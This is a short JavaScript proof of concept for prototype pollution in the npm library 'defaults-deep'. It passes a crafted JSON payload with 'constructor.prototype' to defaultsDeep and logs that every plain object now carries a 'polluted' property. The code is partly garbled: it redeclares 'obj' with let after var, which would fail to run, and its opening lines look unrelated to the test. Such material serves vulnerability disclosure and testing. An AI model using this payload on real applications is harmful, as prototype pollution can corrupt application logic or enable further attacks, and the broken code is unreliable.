var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const defaultsDeep = require('defaults-deep');
let obj = {};
console.log({}.polluted);
let payload = JSON.parse('{"constructor": {"prototype": {"polluted": "yes"}}}');
defaultsDeep(obj, payload);
console.log({}.polluted);